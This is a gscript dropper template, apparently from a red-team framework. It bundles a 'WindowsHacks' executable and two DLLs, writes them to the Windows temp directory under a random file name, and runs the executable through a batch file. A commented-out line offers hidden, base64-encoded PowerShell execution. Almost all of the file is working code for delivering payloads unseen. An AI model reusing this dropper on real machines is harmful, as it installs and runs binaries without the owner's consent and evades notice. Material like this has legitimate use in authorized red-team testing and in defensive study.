// Example gscript template
// Title: WindowsHacks Example
// Author: ahhh
// Purpose: Drops WindowsHacks as an asset and executes it async
// Gscript version: 1.0.0
// ATT&CK: 
// Uses: https://github.com/LazoCoder/Windows-Hacks

//priority:150
//timeout:150

//import:/private/tmp/WindowsHacks.exe
//import:/private/tmp/ImageProcessing.dll
//import:/private/tmp/WindowsAPI.dll

//go_import:os as os2

function Deploy() {  

    console.log("Starting to drop windowz Hacks");
    // Getting our main binary
    var winBin = GetAssetAsBytes("WindowsHacks.exe");
	console.log("errors: "+winBin[1]);
    var temppath = os2.TempDir();
    var naming = G.rand.GetAlphaString(4);
    naming = naming.toLowerCase();
    var fullpath = temppath+"\\"+naming+".exe";
    console.log("file name: "+ fullpath);
    var errors = G.file.WriteFileFromBytes(fullpath, winBin[0]);
    console.log("errors: "+errors);
    // Get our supporting dlls
    // Payload 2
    var winBin2 = GetAssetAsBytes("ImageProcessing.dll");
    var fullpath2 = temppath+"\\ImageProcessing.dll";
    console.log("file name: "+ fullpath2);
    var errors2 = G.file.WriteFileFromBytes(fullpath2, winBin2[0]);
    console.log("errors: "+errors2);
    // Payload 3
    var winBin3 = GetAssetAsBytes("WindowsAPI.dll");
	console.log("errors: "+winBin2[1]);
    var fullpath3 = temppath+"\\WindowsAPI.dll";
    console.log("file name: "+ fullpath3);
    var errors3 = G.file.WriteFileFromBytes(fullpath3, winBin3[0]);
    console.log("errors: "+errors3);

    // Run main payload
    var error4 = G.file.WriteFileFromString(temppath+"\\ok.bat", "echo 5 | "+fullpath);
    //var enc = G.encoding.EncodeBase64("echo 5 | "+fullpath);
    //var cmd = "-WindowStyle Hidden -EncodedCommand "+enc; 
    var running = G.exec.ExecuteCommandAsync(temppath+"\\ok.bat", [""]);
    console.log("errors: "+running[1]);

    return true;
}